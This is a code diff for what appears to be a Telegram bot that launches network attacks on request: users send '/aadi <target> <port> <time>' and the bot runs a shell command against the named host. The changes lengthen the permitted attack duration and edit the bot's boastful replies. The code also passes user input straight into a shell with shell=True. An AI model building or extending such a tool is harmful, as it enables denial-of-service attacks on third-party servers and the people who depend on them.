@@ -217,7 +217,7 @@ def handle_aadi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in aadi_cooldown and (datetime.datetime.now() - aadi_cooldown[user_id]).seconds < 120:
-                response = "THE ATTACK WAS RUNNING PLEASE WAIT SOMETIME TO USE /aadi."
+                response = "THE ATTACK WAS RUNNING PLEASE WAIT 60 SEC TO USE /aadi."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -228,8 +228,8 @@ def handle_aadi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 121:
-                response = "Error: Time interval must be less than 120."
+            if time > 156:
+                response = "Error: Time interval must be less than 155."
             else:
                 record_command_logs(user_id, '/aadi', target, port, time)
                 log_command(user_id, target, port, time)
@@ -238,7 +238,7 @@ def handle_aadi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aadi <target> <port> <time>"  # Updated command syntax
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aadi <target> <port> <time> 800"  # Updated command syntax
     else:
         response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @user_x_dead ."
 
